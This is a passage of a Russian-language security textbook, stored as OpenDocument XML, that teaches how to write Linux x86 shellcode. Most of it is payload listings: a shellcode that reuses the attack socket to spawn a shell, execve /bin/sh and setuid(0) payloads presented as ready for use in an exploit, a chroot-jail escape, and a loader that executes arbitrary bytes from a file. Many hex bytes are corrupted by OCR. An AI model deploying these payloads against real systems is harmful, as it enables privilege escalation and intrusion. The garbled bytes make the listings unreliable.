      <text:p text:style-name="P35">Здесь для каждого дескриптора вызывается функция <text:span text:style-name="T9">getpeername</text:span>(). Если она возвращает отрицательное значение, то это не сокет, и мы переходим к следующему дескриптору. Если это сокет, то мы смотрим, совпадает ли удаленный порт с интересующим нас. Если это так, то дескриптор сокета дублируется на <text:span text:style-name="T9">stdin</text:span> и <text:span text:style-name="T9">stdout</text:span>, после чего запускается интерпретатор команд. Этот shell-код не нуждается в новом соединении для получения оболочки. Интерпретатор команд запускается на том порту, через который ведется атака. </text:p>
      <text:p text:style-name="P61"><text:span text:style-name="T18">Пример 8.12.</text:span> Shell-код findsckcode </text:p>
      <text:p text:style-name="P12"><text:s/>cha<text:span text:style-name="T1">r</text:span> findsckcode[]= <text:span text:style-name="T1"><text:tab/><text:tab/>/* 72 байта */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xdb"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* xor ebx,ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe7" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">edi,</text:span><text:span text:style-name="T1">esp */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x8d\x77<text:span text:style-name="T1">"<text:tab/><text:tab/><text:tab/><text:tab/>/* lea </text:span><text:span text:style-name="T6">esi,[edi+</text:span><text:span text:style-name="T1">0x10</text:span><text:span text:style-name="T6">]</text:span><text:span text:style-name="T1"> */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\x77<text:span text:style-name="T1">"<text:tab/><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">[edi+4],</text:span><text:span text:style-name="T1">esi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x8d\x4f<text:span text:style-name="T1">"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* lea </text:span><text:span text:style-name="T6">ecx,[edi+</text:span><text:span text:style-name="T1">0x20</text:span><text:span text:style-name="T6">]</text:span><text:span text:style-name="T1"> */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\x4f<text:span text:style-name="T1">"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">[edi+8],</text:span><text:span text:style-name="T1">ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb3\xl0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">bl,</text:span><text:span text:style-name="T1">0x10 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xl9" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">[ecx],</text:span><text:span text:style-name="T1">ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xc9" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor ecx,ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb<text:span text:style-name="T1">1</text:span>\xff" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">cl,</text:span><text:span text:style-name="T1">0xff */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\x0f" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">[edi],</text:span><text:span text:style-name="T1">ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x51" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* push ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xc0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor eax,eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x66" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">al,</text:span><text:span text:style-name="T1">0x66 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb3\x07" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">bl,</text:span><text:span text:style-name="T1">7 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xf9" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">ecx,</text:span><text:span text:style-name="T1">edi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int 0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x59" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* pop ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xdb" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor ebx,ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\x39\xd8" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* cmp </text:span><text:span text:style-name="T6">eax,</text:span><text:span text:style-name="T1">ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x75\x0a" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* jne &lt;findsckcode+54&gt; */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x66\xb8\<text:span text:style-name="T1">x12\x33"<text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">bx,</text:span><text:span text:style-name="T1">0x1234 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x66\x39\<text:span text:style-name="T1">x46\x02"<text:tab/><text:tab/>/* cmp </text:span><text:span text:style-name="T6">[esi+2],</text:span><text:span text:style-name="T1">bx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x74\x02" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* je &lt;findsckcode+56&gt; */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\хе2\хе<text:span text:style-name="T1">0"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* loop &lt;findsckcode+24&gt; */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xcb" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">ebx,</text:span><text:span text:style-name="T1">ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xc9" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor ecx,ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xbl\x03" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">cl,</text:span><text:span text:style-name="T1">3 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х31\хс<text:span text:style-name="T1">0"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xor eax,eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xb0\x3f" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* mov </text:span><text:span text:style-name="T6">al,</text:span><text:span text:style-name="T1">0x3f */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х49" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* dec ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int 0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х41" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* inc ecx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xe2\xf6" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* loop &lt;findsckcode+62&gt; */</text:span></text:p>
      <text:h text:style-name="P93" text:outline-level="1">Внедрение shell-кода в локальную программу </text:h>
      <text:p text:style-name="P35">Локальный shell-код не выполняет никаких сетевых операций. Его цель обычно состоит в том, чтобы запустить интерпретатор команд, повысить привилегии атакующего или выйти за пределы части файловой системы, ограниченной системным вызовом chroot. </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Shell-код, выполняющий execve </text:h>
      <text:p text:style-name="P35">Самый простой shell-код выполняет системный вызов <text:span text:style-name="T9">execve</text:span>. Таким образом, он призван выполнить какие-то команды в атакуемой системе, обычно <text:span text:style-name="T9">/bin/sh</text:span>. Вот как выглядит сигнатура функции <text:span text:style-name="T9">execve</text:span> на языке С: </text:p>
      <text:p text:style-name="P57">int execve(char *filename, char *argv[], char *envp[]); </text:p>
      <text:p text:style-name="P35">Параметр <text:span text:style-name="T9">filename</text:span>- это указатель на строку, содержащую имя файла исполняемой программы. Параметр <text:span text:style-name="T9">argv</text:span>[] содержит список аргументов, передаваемых этой программе, а параметр <text:span text:style-name="T9">envp</text:span>[] - список переменных окружения, устанавливаемых перед запуском программы. </text:p>
      <text:p text:style-name="P41"><text:span text:style-name="T8">Алгоритм</text:span> на С</text:p>
      <text:p text:style-name="P12"><text:s/>int main (void) </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">{</text:span>char *argv[2]; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>argv[0] = "/bin/sh"; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>argv[l] = NULL; </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>execve("/bin/sh", arg, NULL); </text:p>
      <text:p text:style-name="P12"><text:s/>} </text:p>
      <text:p text:style-name="P46"><text:soft-page-break/><text:span text:style-name="T4">H</text:span><text:span text:style-name="T18">а языке ассемблера</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/>global main </text:p>
      <text:p text:style-name="P12"><text:s/>main: </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>xor edx,edx </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/><text:span text:style-name="T1"><text:tab/></text:span>push edx<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; 0x00000000 =&gt; stack</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>push <text:span text:style-name="T1">0</text:span>x68732f2f <text:span text:style-name="T1"><text:tab/><text:tab/>; "hs//" =&gt; stack</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/><text:tab/></text:span>push 0x6e69622f <text:span text:style-name="T1"><text:tab/><text:tab/>; "nib/" =&gt; stack</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>mov <text:span text:style-name="T1">ebx,</text:span>esp </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>push edx<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; 0x00000000 =&gt; stack</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>push ebx <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; </text:span><text:span text:style-name="T8">адрес </text:span><text:span text:style-name="T1">"/bin//sh" =&gt; stack</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>mov <text:span text:style-name="T1">ecx,</text:span>esp </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>lea<text:span text:style-name="T1"> eax,[edx+11]</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:tab/></text:span>int 0x80 <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>; execve("/bin//sh",**argv,0)</text:span></text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T18">Shell-код</text:span> в виде, пригодном для вставки в эксплойт</text:p>
      <text:p text:style-name="P12"><text:s/>const char execve[] = </text:p>
      <text:p text:style-name="P12"><text:s/>"\x31\xd2" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* xorl %edx, %edx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x52" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* pushl %edx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x68\x2f\x2f\x73\x68" <text:span text:style-name="T1"><text:tab/></text:span>/* pushl $0x68732f2f */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x68\x2f\x62\x69\x6e" <text:span text:style-name="T1"><text:tab/></text:span>/* pushl $0x6e69622f */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe3" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* movl %esp, %ebx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x52" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* pushl %edx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x53" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>/* pushl %ebx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xel" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* movl %esp, %ecx */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\x8d\x42\x0b" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* leal 0xb(%edx), %eax */ </text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>/* int $0x80 */ </text:p>
      <text:p text:style-name="P35">Этот оптимизированный shell-код занимает всего 24 байта и не содержит нулей. В процедуре написания shell-кода столько же от науки, сколько и от искусства. В языке ассемблера одну и ту же задачу можно решить множеством способов. При выборе одних операций код получится длиннее, при выборе других короче. Опытные программисты, конечно, используют самые короткие операции. </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Shell-код, выполняющий setuid </text:h>
      <text:p text:style-name="P43">Часто при атаке на некоторую программу с целью получить права суперпользователя root атакующий получает <text:span text:style-name="T9">euid</text:span> (действующий идентификатор пользователя), равный 0, тогда как нужно, чтобы <text:span text:style-name="T9">uid</text:span> был равен 0. Ниже приведен небольшой shell-код, решающий эту проблему. С-код, обращающийся к системному вызову <text:span text:style-name="T9">setuid</text:span>: </text:p>
      <text:p text:style-name="P12"><text:s/>int main(void) </text:p>
      <text:p text:style-name="P12"><text:s/>{ </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>setuid<text:span text:style-name="T1">(0</text:span>); </text:p>
      <text:p text:style-name="P12"><text:s/>} </text:p>
      <text:p text:style-name="P43">Чтобы сделать то же самое на ассемблере, нужно записать 0 в регистр ЕВХ и обратиться к системному вызову <text:span text:style-name="T9">setuid</text:span>. Для Linux соответствующий код выглядит так: </text:p>
      <text:p text:style-name="P12"><text:s/>xorl %ebx,%ebx </text:p>
      <text:p text:style-name="P12"><text:s/>leal 0x17(%ebx),%eax </text:p>
      <text:p text:style-name="P12"><text:s/>int $0x80 </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Shell-код, выполняющий chroot </text:h>
      <text:p text:style-name="P44">Некоторым приложениям во время выполнения запрещено выходить за пределы части файловой системы, начинающейся с определенного каталога, задаваемого администратором с помощью системного вызова <text:span text:style-name="T9">chroot</text:span>. При атаке на такую программу необходим способ вырваться из этой тюрьмы еще до запуска интерпретатора, поскольку в противном случае файл «/bin/sh» просто не будет найден. Сначала традиционный способ, издавна применявшийся для освобождения из <text:span text:style-name="T19">chroot</text:span>-тюрьмы в Linux. Нужно создать внутри тюрьмы <text:s/>каталог, выполнить <text:span text:style-name="T9">chroot</text:span><text:span text:style-name="T2">,</text:span> указав путь к этому каталогу в качестве параметра, а затем попытаться выполнить системный вызов <text:span text:style-name="T9">chdir</text:span>, задав путь «<text:span text:style-name="T11">../../../../../../../..</text:span>». </text:p>
      <text:p text:style-name="P42">Код на С: </text:p>
      <text:p text:style-name="P12"><text:s/>int main(void) </text:p>
      <text:p text:style-name="P12"><text:s/>{ </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/>mkdir("A"); </text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1"><text:s/></text:span><text:s/><text:span text:style-name="T1">chdir("A");</text:span> </text:p>
      <text:p text:style-name="P12"><text:s text:c="2"/>chroot("..//..//..//..//..//..//..//..//"); </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1"><text:s/></text:span>system("/bin/sh"); </text:p>
      <text:p text:style-name="P12"><text:s/>} </text:p>
      <text:p text:style-name="P61">В виде, пригодном для вставки в эксплойт, этот код выглядит так: </text:p>
      <text:p text:style-name="P12"><text:s/>const char chroot[] = </text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\x31\xd2" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xorl %esx,%edx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х52" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* pushl %edx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x6a\x41"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* push $0x41 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe3"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* movl %esp,%ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\x66\xb9\xed\x01"<text:span text:style-name="T1"><text:tab/><text:tab/>/* movw $0x01ed,%cx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"<text:span text:style-name="T32">\</text:span>x8d\x42\x3d" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* leal 0x27(%edx),%eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/><text:span text:style-name="T1">"</text:span>\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int $0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xRd\x42\x3d" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* leal 0x2d(%edx),%eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xc<text:span text:style-name="T1">d</text:span>\x<text:span text:style-name="T1">8</text:span>0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int $0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x<text:span text:style-name="T1">31</text:span>\xf<text:span text:style-name="T1">16"</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* xorl %esi,%esi*/</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х52" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* pushl %edx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x68\x2e\x2e\x2f\x2f"<text:span text:style-name="T1"><text:tab/><text:tab/>/* pushl $0x2f2f2e2e */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х4<text:span text:style-name="T1">6</text:span>"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* incl %esi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x83\xfe\xl0" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* cmpl $0x10,%esi */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x7c\xf5" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* jl &lt;loop&gt; */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe3"<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* movl %esp, %ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x8d\x42\x3d" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* leal 0x3d(%edx),%eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int $0x80 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\х52" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/>/* pushl %edx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\хба\х41" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* push $0x41 */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x89\xe3" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* movl %esp,%ebx */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\x8d\x42\x28" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* leal 0x28(%edx),%eax */</text:span></text:p>
      <text:p text:style-name="P12"><text:s/>"\xcd\x80" <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>/* int $0x80 */</text:span></text:p>
      <text:h text:style-name="P91" text:outline-level="2"><text:soft-page-break/>Процедура печати и выполнения shell-кода.</text:h>
      <text:p text:style-name="P17">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P17">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P18">#include &lt;<text:span text:style-name="T32">sys/mman.h</text:span>&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">int main(int argc, char **argv){</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>FILE *f;</text:p>
      <text:p text:style-name="P25"><text:s text:c="2"/>unsigned char *code, *pcode;</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>int i, l, flen;</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>void (*fptr)(void);</text:p>
      <text:p text:style-name="P18"><text:s text:c="2"/><text:span text:style-name="T32">code=malloc(1500);</text:span></text:p>
      <text:p text:style-name="P25"><text:s text:c="2"/>if(argc!=2) { </text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>printf("Печать и исполнение shell-кода : %s &lt;файл&gt;\n",</text:p>
      <text:p text:style-name="P26"><text:tab/><text:tab/> argv[0]); exit(1); </text:p>
      <text:p text:style-name="P25"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>if((f = fopen(argv[1],"rb"))<text:span text:style-name="T32">==0</text:span>) {</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/>printf("Ошибка при открытии файла");exit(1);</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P18"><text:s text:c="2"/><text:span text:style-name="T32">pcode=code;</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>while(1) { </text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>i=fread(pcode,1,1,f); </text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>if(i==1) pcode++; </text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>else break; </text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>} </text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>flen=pcode-code;</text:p>
      <text:p text:style-name="P19"><text:s text:c="2"/>fclose(f);</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>printf("\nДлина shell-кода %d байтов: \n", flen);</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>printf("\n shellcode[] = \n");</text:p>
      <text:p text:style-name="P18"><text:s text:c="2"/>l=<text:span text:style-name="T32">10</text:span>;<text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T32">// 10 - число байт в строке</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>for(i=0; i&lt;flen; ++i){</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/>if(l&gt;=<text:span text:style-name="T32">10</text:span>){</text:p>
      <text:p text:style-name="P17"><text:s text:c="6"/>if(i) printf("\"\n"); </text:p>
      <text:p text:style-name="P17"><text:s text:c="6"/>printf("\t\""); l=0;</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/>++l;</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/>printf("\\x%02x", ((unsigned char *)code)[i]);</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>printf("\";\n\n");</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>printf("Вызывается код...");</text:p>
      <text:p text:style-name="P25"><text:s text:c="2"/>void *prt=(void *)((long int)code&amp;0xfffff000);</text:p>
      <text:p text:style-name="P25"><text:s text:c="2"/>mprotect(prt, 1024, 7);</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>fptr=(void(*) (void)) code;</text:p>
      <text:p text:style-name="P17"><text:s text:c="2"/>(*fptr)();</text:p>
      <text:p text:style-name="P17">}</text:p>
      <text:p text:style-name="P4">Для компиляции программы <text:s/>выполните команду: </text:p>
      <text:p text:style-name="P62"><text:span text:style-name="T11">gсс -о </text:span><text:span text:style-name="T15">s-proc</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T15">s-proc</text:span><text:span text:style-name="T11">.c </text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Системный вызов write </text:h>
      <text:p text:style-name="P63">В качестве вводного примера лучше всего подойдет shell-код, который <text:s/><text:line-break/>выводит строку «Hello, world!» на терминал. </text:p>
      <text:p text:style-name="P39"><text:s/>bits 32</text:p>
      <text:p text:style-name="P12"><text:s/>xor eax,eax </text:p>
      <text:p text:style-name="P12"><text:s/>xor ebx,ebx </text:p>
      <text:p text:style-name="P12"><text:s/>xor ecx,ecx </text:p>
      <text:p text:style-name="P12"><text:s/>xor edx,edx </text:p>
      <text:p text:style-name="P12"><text:s/>jmp short string </text:p>
      <text:p text:style-name="P12">code: </text:p>
      <text:p text:style-name="P12"><text:s/>pop ecx </text:p>
      <text:p text:style-name="P12"><text:s/>mov bl,1 </text:p>
      <text:p text:style-name="P12"><text:s/>mov dl,1<text:span text:style-name="T7">4</text:span> </text:p>
      <text:p text:style-name="P12"><text:s/>mov al,4 </text:p>
      <text:p text:style-name="P12"><text:s/>int 0x80 </text:p>
      <text:p text:style-name="P12"><text:s/>dec bl </text:p>
      <text:p text:style-name="P12"><text:s/>mov al,1 </text:p>
      <text:p text:style-name="P12"><text:s/>int 0x80 </text:p>
      <text:p text:style-name="P12">string: </text:p>
      <text:p text:style-name="P12"><text:s/>call code </text:p>
      <text:p text:style-name="P12"><text:s/>db 'Hello, world!<text:span text:style-name="T1">',</text:span><text:span text:style-name="T7">0xa</text:span> </text:p>
      <text:p text:style-name="P4">Откомпилируем и выполним этот код, чтобы убедиться, что все работает:</text:p>
      <text:p text:style-name="P6">[root@gabriel]# nasm -о newline newline.S </text:p>
      <text:p text:style-name="P12">[root@gabriel]# s-proc newline </text:p>
      <text:p text:style-name="P12">Calling code... </text:p>
      <text:p text:style-name="P12">Hello, world! </text:p>
      <text:p text:style-name="P12">[root@gabriel]# </text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Системный вызов execve </text:h>
      <text:p text:style-name="P33">Shell-код для выполнения системного вызова <text:span text:style-name="T9">execve</text:span>, наверное, встречается чаще всего. Смысл его в том, чтобы запустить из приложения, в которое он внедрен, некоторую программу, например, <text:span text:style-name="T9">/bin/sh</text:span>. Мы рассмотрим несколько реализации такого shell-кода с применением техники jmp/call и заталкивания строки в стек. В странице руководства по системному вызову execve описан его прототип: </text:p>
      <text:p text:style-name="P5">int execve(char *path, char *argv[], char *envp[]);</text:p>
      <text:p text:style-name="P33">Первый аргумент - это указатель на строку, содержащую путь к исполняемому файлу, второй - массив строк. Каждая строка в этом массиве содержит один из передаваемых программе аргументов. Последний аргумент <text:span text:style-name="T9">execve </text:span>- это тоже массив строк, на сей раз содержащих переменные окружения, которые должна видеть программа. </text:p>
      <text:p text:style-name="P40">Реализация обращения к <text:span text:style-name="T9">execve</text:span> в Linux на языке С: </text:p>
      <text:p text:style-name="P11">int main() { </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>char *command = "/bin/sh"; </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>char *args[2]; </text:p>
      <text:p text:style-name="P11"><text:soft-page-break/><text:s text:c="2"/>args[0] = command; </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>args[l] = 0; </text:p>
      <text:p text:style-name="P11"><text:s text:c="2"/>execve(command, args, 0) ; </text:p>
      <text:p text:style-name="P11">} </text:p>
      <text:p text:style-name="P3">На ассемблере:</text:p>
      <text:p text:style-name="P37"><text:s/>BITS 32 </text:p>
      <text:p text:style-name="P11"><text:s/>jmp short callit </text:p>
      <text:p text:style-name="P11"><text:s/>doit: </text:p>
      <text:p text:style-name="P11"><text:s/>pop ebx </text:p>
      <text:p text:style-name="P11"><text:s/>xor eax,eax </text:p>
      <text:p text:style-name="P11"><text:s/>cdq </text:p>
      <text:p text:style-name="P11"><text:s/>mov [ebx+7],al </text:p>
      <text:p text:style-name="P11"><text:s/>mov [ebx+8],ebx </text:p>
      <text:p text:style-name="P11"><text:s/>mov [ebx+12],eax </text:p>
      <text:p text:style-name="P11"><text:s/>lea ecx,[ebx+8] </text:p>
      <text:p text:style-name="P11"><text:s/>mov al,0x0b </text:p>
